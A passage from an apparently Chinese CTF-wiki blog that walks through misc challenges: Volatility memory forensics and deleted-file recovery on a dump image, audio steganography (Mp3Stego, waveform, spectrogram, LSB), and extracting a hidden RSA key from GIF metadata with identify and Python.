volatility.debug    <span class="token builtin class-name">:</span> Determining profile based on KDBG search<span class="token punctuation">..</span>.          Suggested Profile<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418                     AS Layer1 <span class="token builtin class-name">:</span> WindowsAMD64PagedMemory <span class="token punctuation">(</span>Kernel AS<span class="token punctuation">)</span>                     AS Layer2 <span class="token builtin class-name">:</span> FileAddressSpace <span class="token punctuation">(</span>/Users/secgxx/Desktop/CTF/0x04MISC/内存分析/例题-easy_dump/easy_dump.img<span class="token punctuation">)</span>                      PAE <span class="token builtin class-name">type</span> <span class="token builtin class-name">:</span> No PAE                           DTB <span class="token builtin class-name">:</span> 0x187000L                          KDBG <span class="token builtin class-name">:</span> 0xf8000403b070L          Number of Processors <span class="token builtin class-name">:</span> <span class="token number">1</span>     Image Type <span class="token punctuation">(</span>Service Pack<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> <span class="token number">0</span>                KPCR <span class="token keyword">for</span> CPU <span class="token number">0</span> <span class="token builtin class-name">:</span> 0xfffff8000403cd00L             KUSER_SHARED_DATA <span class="token builtin class-name">:</span> 0xfffff78000000000L           Image <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2018</span>-10-02 <span class="token number">13</span>:53:05 UTC+0000     Image <span class="token builtin class-name">local</span> <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2018</span>-10-02 <span class="token number">21</span>:53:05 +0800</code></pre><p>查看一下系统进程</p><pre class="language-console" data-language="console"><code class="language-console">volatility -f easy_dump.img --profile&#x3D;Win7SP1x64 psscanVolatility Foundation Volatility Framework 2.6.1Offset(P)          Name                PID   PPID PDB                Time created                   Time exited------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------0x00000000230b1310 conhost.exe         860    408 0x0000000021401000 2018-10-02 13:53:04 UTC+00000x00000000230f5b30 audiodg.exe        2720    768 0x000000001b805000 2018-10-02 13:52:48 UTC+00000x000000002326bb30 VGAuthService.     1680    500 0x0000000007845000 2018-10-02 13:21:08 UTC+00000x00000000232b5970 SearchIndexer.     2308    500 0x0000000006faf000 2018-10-02 13:21:13 UTC+00000x00000000233005c0 vmtoolsd.exe       1704    500 0x0000000015204000 2018-10-02 13:21:08 UTC+00000x0000000023344060 dllhost.exe        2760    624 0x0000000010636000 2018-10-02 13:52:59 UTC+00000x000000002338f910 WmiPrvSE.exe       1468    624 0x0000000006df2000 2018-10-02 13:21:09 UTC+00000x00000000233a5640 dllhost.exe        1588    500 0x000000000ea59000 2018-10-02 13:21:09 UTC+00000x00000000233ae060 svchost.exe        1964    500 0x0000000002587000 2018-10-02 13:21:09 UTC+00000x00000000233d8060 TPAutoConnSvc.     2008    500 0x0000000001c0d000 2018-10-02 13:21:09 UTC+00000x00000000233e74e0 msdtc.exe           864    500 0x000000001c3e2000 2018-10-02 13:21:11 UTC+00000x000000002346faa0 svchost.exe         388    500 0x000000001e498000 2018-10-02 13:21:06 UTC+00000x000000002348e9e0 svchost.exe        1000    500 0x000000001e5a2000 2018-10-02 13:21:06 UTC+00000x00000000235275f0 dwm.exe            1232    880 0x000000002041c000 2018-10-02 13:21:07 UTC+00000x000000002353ab30 taskhost.exe       1260    500 0x0000000007324000 2018-10-02 13:21:07 UTC+00000x0000000023580950 svchost.exe        1316    500 0x000000001e807000 2018-10-02 13:21:07 UTC+00000x00000000235ab170 DumpIt.exe         1056   1244 0x00000000042a0000 2018-10-02 13:53:04 UTC+00000x00000000235eb060 vmtoolsd.exe       1416   1244 0x000000001f1fa000 2018-10-02 13:21:07 UTC+00000x0000000023607060 csrss.exe           408    388 0x000000000c4b6000 2018-10-02 13:21:05 UTC+00000x0000000023633b30 spoolsv.exe        1196    500 0x0000000015355000 2018-10-02 13:21:07 UTC+00000x0000000023647060 winlogon.exe        456    388 0x000000000ad3c000 2018-10-02 13:21:05 UTC+00000x00000000236815f0 services.exe        500    396 0x0000000008d41000 2018-10-02 13:21:05 UTC+00000x00000000236836e0 lsm.exe             516    396 0x000000000a32c000 2018-10-02 13:21:05 UTC+00000x000000002368b220 lsass.exe           508    396 0x000000000a164000 2018-10-02 13:21:05 UTC+00000x0000000023690b30 svchost.exe         624    500 0x00000000090e2000 2018-10-02 13:21:05 UTC+00000x0000000023705b30 explorer.exe       1244   1204 0x00000000092c2000 2018-10-02 13:21:07 UTC+00000x00000000237304a0 svchost.exe         716    500 0x00000000086ea000 2018-10-02 13:21:06 UTC+00000x0000000023738b30 vmacthlp.exe        684    500 0x000000000769e000 2018-10-02 13:21:06 UTC+00000x00000000237614a0 svchost.exe         768    500 0x0000000008675000 2018-10-02 13:21:06 UTC+00000x00000000237dc060 svchost.exe         880    500 0x000000001bf44000 2018-10-02 13:21:06 UTC+00000x00000000237e4b30 svchost.exe         940    500 0x000000001b693000 2018-10-02 13:21:06 UTC+00000x00000000239fb060 wininit.exe         396    336 0x000000000c9fc000 2018-10-02 13:21:05 UTC+00000x0000000023bb4060 csrss.exe           344    336 0x000000000ccf6000 2018-10-02 13:21:04 UTC+00000x0000000024659b30 smss.exe            260      4 0x00000000104a3000 2018-10-02 13:21:03 UTC+00000x0000000024810060 sppsvc.exe         2472    500 0x000000000b296000 2018-10-02 13:23:09 UTC+00000x000000002491bb30 svchost.exe        2220    500 0x0000000018271000 2018-10-02 13:23:09 UTC+00000x0000000024b47870 TPAutoConnect.     2548   2008 0x0000000018d3d000 2018-10-02 13:21:19 UTC+00000x0000000024b48490 conhost.exe        2556    408 0x000000000fa02000 2018-10-02 13:21:19 UTC+00000x00000000254b3b30 notepad.exe        2872   1244 0x0000000008151000 2018-10-02 13:26:51 UTC+00000x0000000025749b30 System                4      0 0x0000000000187000 2018-10-02 13:21:03 UTC+0000</code></pre><p>这里有两个进程<code>DumpIt.exe</code>和<code>notepad.exe</code>两个进程，对应着两种不同的思路。</p><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>把 <code>notepad.exe</code>dump出来</p><pre class="language-console" data-language="console"><code class="language-console">volatility -f easy_dump.img --profile&#x3D;Win7SP1x64 memdump -p 2872 -D .Volatility Foundation Volatility Framework 2.6.1************************************************************************Writing notepad.exe [  2872] to 2872.dmp</code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211025162259.png" alt="20211025162259"></p><p>这里获取了提示，内存里面有一个图片</p><blockquote><p>这里不知道为什么kali和mac里面的strings出来的结果不一样- -</p></blockquote><p>于是利用filescan获取了一张图片，并将其dump出来</p><pre class="language-console" data-language="console"><code class="language-console"> volatility -f easy_dump.img --profile&#x3D;Win7SP1x64 filescan|grep jpgVolatility Foundation Volatility Framework 2.6.10x000000002557b2b0     32      0 RW---- \Device\HarddiskVolume1\phos.jpg</code></pre><p>使用binwalk进行分析</p><pre class="language-console" data-language="console"><code class="language-console">binwalk phos.jpgDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             JPEG image data, EXIF standard12            0xC             TIFF image data, little-endian offset of first image directory: 82238922       0x2229CA        Zip archive data, at least v2.0 to extract, compressed size: 87797, uncompressed size: 1048576, name: message.img2326869       0x238155        End of Zip archive, footer length: 22</code></pre><p>发现图片里有一个<code>message.img</code>，分离出来</p><pre class="language-console" data-language="console"><code class="language-console">binwalk -e -o 0x2229CA phos.jpgDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------2238922       0x2229CA        Zip archive data, at least v2.0 to extract, compressed size: 87797, uncompressed size: 1048576, name: message.img2326869       0x238155        End of Zip archive, footer length: 22file message.imgmessage.img: Linux rev 1.0 ext2 filesystem data, UUID&#x3D;34d27b8e-1aa5-441f-bfd9-bdc765cc4edd (large files)</code></pre><p>发现是一个ext2的文件系统，在linux里面挂载，挂载之后发现了hint.txt</p><pre class="language-console" data-language="console"><code class="language-console">[Desktop] mkdir message                                                     [Desktop] id                                                                uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),144(kaboxer)[Desktop] mount message.img .&#x2F;message                                       [Desktop] cd message                                                        [message] ls -la                                                            total 271drwxr-xr-x 4 root root   1024 Oct  1  2018 .drwxr-xr-x 3 root root   4096 Oct 25 17:04 ..-rw-r--r-- 1 root root 257163 Sep 28  2018 hint.txtdrwx------ 2 root root  12288 Oct  1  2018 lost+founddrwx------ 4 root root   1024 Oct  1  2018 .Trash-0</code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211025170826.png" alt="20211025170826"></p><p>这里发现似乎是一个269x269的二维码坐标，这里根据坐标画图提供两种方法</p><ul><li><p>方法一：gnuplot<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211025173353.png" alt="20211025173353"><br>得到一个二维码以后，获取了提示信息<code>Here is the vigenere key: aeolus, but i deleted the encrypted message。</code><br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211025173706.png" alt="20211025173706"></p></li><li><p>方法二：python脚本</p><ul><li>脚本一：<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> ImageMAX <span class="token operator">=</span> <span class="token number">32</span>pic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'message.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>s<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token string">''</span><span class="token comment">#lines=35345</span><span class="token keyword">while</span> s<span class="token punctuation">:</span>    a<span class="token operator">=</span>s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>    x<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    y<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> x<span class="token punctuation">,</span>y    pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pic<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>pic<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"flag.png"</span><span class="token punctuation">)</span></code></pre><ul><li>脚本二：<pre class="language-python" data-language="python"><code class="language-python">    <span class="token comment">#脚本文件</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'hint.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>datas <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> data <span class="token keyword">in</span> datas<span class="token punctuation">:</span>        arr <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        x<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span><span class="token string">'ks'</span><span class="token punctuation">,</span>ms<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>根据提示我们去翻找一下垃圾箱，找到了<code>.message.swp</code>也就是vim中断后产生的文件<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211025171127.png" alt="20211025171127"></li></ul></li></ul></li></ul><p>最终vigenere解密获得key</p><h4 id="思路一分支"><a href="#思路一分支" class="headerlink" title="思路一分支"></a>思路一分支</h4><p>在获取提示以后，其实还有另外一种思路，就是从磁盘中恢复删除的文件，这里了解到了一个新的软件<a href="https://www.cgsecurity.org/wiki/TestDisk_Download">testdisk</a></p><p>在命令行输入<code>testdisk message.img</code>进入操作界面<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211026141151.png" alt="20211026141151"></p><p>进入之后选择List，就会发现一个标红的<code>.message.swp</code>也就是提示中说到的删除的文件<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211026141323.png" alt="20211026141323"></p><p>之后先按小写c再按一下大写C就可以复制出来了（注意版本和平台都可能影响选项）</p><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>思路二也就是通过dump<code>DumpIt.exe</code>这个进程来分析</p><pre class="language-console" data-language="console"><code class="language-console">volatility -f easy_dump.img --profile&#x3D;Win7SP1x64 memdump -p 1056 -D .Volatility Foundation Volatility Framework 2.6.1************************************************************************Writing DumpIt.exe [  1056] to 1056.dmp</code></pre><p>使用binwalk分析的时候会发现有<code>message.img</code>这个文件<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211026144143.png" alt="20211026144143"></p><p>使用foremost提取出来之后，这里采用了DiskGenius分析。可以达到与之前提到的在linux里面挂载一样的效果。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211026145528.png" alt="20211026145528"></p><h2 id="待更新-2021祥云杯-层层取证；2020网鼎杯密码柜"><a href="#待更新-2021祥云杯-层层取证；2020网鼎杯密码柜" class="headerlink" title="待更新-2021祥云杯-层层取证；2020网鼎杯密码柜"></a>待更新-2021祥云杯-层层取证；2020网鼎杯密码柜</h2><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/q20010619/article/details/120390580">https://blog.csdn.net/q20010619/article/details/120390580</a></li><li><a href="https://bbs.ichunqiu.com/thread-46855-1-1.html">https://bbs.ichunqiu.com/thread-46855-1-1.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-misc-video</title>
      <link href="/ctf/wiki/ctf-misc-video/"/>
      <url>/ctf/wiki/ctf-misc-video/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文例题下载地址：链接: <a href="https://pan.baidu.com/s/1NflN8kVEdL9CqsbGyrKFVA">https://pan.baidu.com/s/1NflN8kVEdL9CqsbGyrKFVA</a> 提取码: ulpn </p></blockquote><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><p>与音频相关的 CTF 题目主要使用了隐写的策略，主要分为 MP3 隐写，LSB 隐写，波形隐写，频谱隐写等等。</p><h3 id="常见手段"><a href="#常见手段" class="headerlink" title="常见手段"></a>常见手段</h3><p>通过 <code>binwalk</code> 以及 <code>strings</code> 可以发现的信息不再详述。</p><h3 id="MP3-隐写"><a href="#MP3-隐写" class="headerlink" title="MP3 隐写"></a>MP3 隐写</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>MP3隐写主要是使用 <a href="http://www.petitcolas.net/steganography/mp3stego/">Mp3Stego</a> 工具进行隐写，其基本介绍及使用方法如下</p><pre class="language-bash" data-language="bash"><code class="language-bash">encode <span class="token parameter variable">-E</span> hidden_text.txt <span class="token parameter variable">-P</span> pass svega.wav svega_stego.mp3decode <span class="token parameter variable">-X</span> <span class="token parameter variable">-P</span> pass svega_stego.mp3</code></pre><p>此外这个工具也有一个gui的版本。</p><pre class="language-console" data-language="console"><code class="language-console">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1EKblDmkcRSxaN8lmqCMD0g 提取码: 88qt --来自百度网盘超级会员v3的分享</code></pre><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><blockquote><p>ISCC-2016: Music Never Sleep</p></blockquote><p>初步观察后，由 <code>strings</code> 得到密码后使用 <code>Mp3Stego</code> 解密。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211009160707.png" alt="20211009160707"></p><p>需要注意的是，这个GUI工具需要把需要解密的文件放到程序的根目录下面</p><p>得到文件 <code>iscc2016.mp3.txt</code>:</p><pre class="language-none"><code class="language-none">Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ&#x3D;&#x3D; ???</code></pre><p>Base64 &amp;&amp; Base32 后得到 flag。</p><h3 id="波形"><a href="#波形" class="headerlink" title="波形"></a>波形</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>通常来说，波形方向的题，在观察到异常后，使用相关软件（Audacity, Adobe Audition 等）观察波形规律，将波形进一步转化为 01 字符串等，从而提取转化出最终的 flag。</p><h4 id="例题-波形1"><a href="#例题-波形1" class="headerlink" title="例题-波形1"></a>例题-波形1</h4><p>使用Audacity打开，观察波形</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211009165548.png" alt="20211009165548"></p><p>长短空，猜测是摩斯密码。</p><pre class="language-none"><code class="language-none">.... .-.. . .. -.-. .. -.-. - ... - .-- --- --- -.-. ..-. . -- -.-. -. .----</code></pre><p>摩斯密码解密，在进行栅栏得到 flag。</p><h4 id="例题-波形2"><a href="#例题-波形2" class="headerlink" title="例题-波形2"></a>例题-波形2</h4><p>打开波形图，发现最前段有异常<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211009165822.png" alt="20211009165822"></p><p>取高点为1，低点为0得</p><pre class="language-console" data-language="console"><code class="language-console">110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101</code></pre><p>取值以后发现一共105位，为7的倍数，因此猜测需要7位一组补0后转ascii得flag</p><h3 id="频谱"><a href="#频谱" class="headerlink" title="频谱"></a>频谱</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>音频中的频谱隐写是将字符串隐藏在频谱中，此类音频通常会有一个较明显的特征，听起来是一段杂音或者比较刺耳。</p><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><blockquote><p>Su-ctf-quals-2014:hear_with_your_eyes</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211009162548.png" alt="20211009162548"></p><h3 id="LSB音频隐写"><a href="#LSB音频隐写" class="headerlink" title="LSB音频隐写"></a>LSB音频隐写</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>类似于图片隐写中的 LSB 隐写，音频中也有对应的 LSB 隐写。主要可以使用 <a href="http://silenteye.v1kings.io/">Silenteye</a> 工具。</p><h4 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h4><blockquote><p>2015 广东省强网杯 - Little Apple</p></blockquote><p>直接使用 <code>silenteye</code> 即可。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20211009170945.png" alt="20211009170945"></p><h3 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h3><ul><li><a href="https://ethackal.github.io/2015/10/05/derbycon-ctf-wav-steganography/">音频中的 LSB</a></li><li><a href="http://bobao.360.cn/learning/detail/243.html">隐写术总结</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-misc-pic</title>
      <link href="/ctf/wiki/ctf-misc-pic/"/>
      <url>/ctf/wiki/ctf-misc-pic/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文题目链接: <a href="https://pan.baidu.com/s/1SQcUY2jUt1NvX7VSvIyf9Q">https://pan.baidu.com/s/1SQcUY2jUt1NvX7VSvIyf9Q</a> 提取码: 9p2k </p></blockquote><h2 id="常见图片文件头"><a href="#常见图片文件头" class="headerlink" title="常见图片文件头"></a>常见图片文件头</h2><table><thead><tr><th>文件类型</th><th>文件头</th><th>文件尾</th></tr></thead><tbody><tr><td>JPEG&#x2F;JPG</td><td>FF D8</td><td>FF D9</td></tr><tr><td>PNG</td><td>89 50 4E 47 0D 0A 1A 0A</td><td>AE 42 60 82</td></tr><tr><td>GIF</td><td>47 49 46 38 39(37) 61</td><td>00 3B</td></tr></tbody></table><h2 id="元数据（Metadata）"><a href="#元数据（Metadata）" class="headerlink" title="元数据（Metadata）"></a>元数据（Metadata）</h2><blockquote><p>元数据（Metadata），又称中介数据、中继数据，为描述数据的数据（Data about data），主要是描述数据属性（property）的信息，用来支持如指示存储位置、历史数据、资源查找、文件记录等功能。</p></blockquote><p>元数据中隐藏信息在比赛中是最基本的一种手法，通常用来隐藏一些关键的 <code>Hint</code> 信息或者是一些重要的如 <code>password</code> 等信息。</p><p>这类元数据你可以 <code>右键 --&gt; 属性</code> 去查看,也可以通过 <code>strings</code> 命令去查看，一般来说，一些隐藏的信息（奇怪的字符串）常常出现在头部或者尾部。</p><p>接下来介绍一个 <code>identify</code> 命令，这个命令是用来获取一个或多个图像文件的格式和特性。这个命令的获取是在安装了<code>Imagemagick</code>这个包以后获取的。</p><p><code>-format</code> 用来指定显示的信息，灵活使用它的 <code>-format</code> 参数可以给解题带来不少方便。<a href="https://www.imagemagick.org/script/escape.php">format各个参数具体意义</a></p><h3 id="例题-Mysterious-GIF"><a href="#例题-Mysterious-GIF" class="headerlink" title="例题-Mysterious GIF"></a>例题-Mysterious GIF</h3><p><a href="https://github.com/ctfs/write-ups-2017/tree/master/breakin-ctf-2017/misc/Mysterious-GIF">Break In 2017 - Mysterious GIF</a></p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210909142346.png" alt="20210909142346"></p><blockquote><p>这里需要用binwalk -e 分离tmp.zip</p></blockquote><p>提取之后发现是一堆.enc文件，因此下一步就是要找enc文件解密需要的key，这里分别对GIF、enc文件、压缩包进行strings，在GiF中找到了一串16进制字符串</p><p>这题的一个难点是发现并提取 GIF 中的元数据，首先 <code>strings</code> 是可以观察到异常点的。</p><pre class="language-bash" data-language="bash"><code class="language-bash">GIF89a   <span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token string">""</span>"#<span class="token comment">##$$$%%%&amp;&amp;&amp;'''((()))***+++,,,---...///000111222333444555666777888999:::;;;&lt;&lt;&lt;===>>>???@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ[[[\\\]]]^^^___```aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqqrrrssstttuuuvvvwwwxxxyyyzzz&#123;&#123;&#123;|||&#125;&#125;&#125;~~~</span>4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172NETSCAPE2.0ImageMagick<span class="token punctuation">..</span>.</code></pre><p>这里的一串16进制其实是藏在 GIF 的元数据区</p><p>接下来就是提取，你可以选择 Python，但是利用 <code>identify</code> 显得更加便捷</p><pre class="language-bash" data-language="bash"><code class="language-bash">root <span class="token keyword">in</span> ~/Desktop/tmp λ identify <span class="token parameter variable">-format</span> <span class="token string">"%s %c <span class="token entity" title="\n">\n</span>"</span> Question.gif<span class="token number">0</span> 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172<span class="token number">1</span> 5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271<span class="token punctuation">..</span>.<span class="token number">24</span> 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f<span class="token number">25</span> 724b3052485a6b745062457335797444737142486435504646773d3d</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> os<span class="token keyword">import</span> binasciios<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'identify -format "%c \n" Question.gif > key'</span><span class="token punctuation">)</span>temp<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'key1'</span><span class="token punctuation">,</span> <span class="token string">'wb+'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">:</span>    i <span class="token operator">=</span> i<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    i<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    i<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    i <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment"># </span>    i <span class="token operator">=</span> i<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    i <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    temp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm -f key'</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span><span class="token string">'key1'</span><span class="token punctuation">,</span><span class="token string">'key'</span><span class="token punctuation">)</span></code></pre><p>这道题的下一个难点就是在做了十六进制解码以后，意识到这是一个rsakey</p><p>意识到这个是个私钥以后就好办了，先解密一个partaa.enc看一下<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210910103938.png" alt="20210910103938"></p><p>于是脚本搞定</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> string<span class="token keyword">import</span> osdic <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lettersi<span class="token operator">=</span><span class="token number">0</span>i1<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span>dic<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> n <span class="token keyword">in</span> dic<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token comment"># file = 'part'</span>    <span class="token comment"># file = file+str(n)</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> dic<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        file1<span class="token operator">=</span><span class="token string">''</span>        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'part'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>        <span class="token comment"># print(file)</span>        file1 <span class="token operator">=</span> <span class="token builtin">file</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token 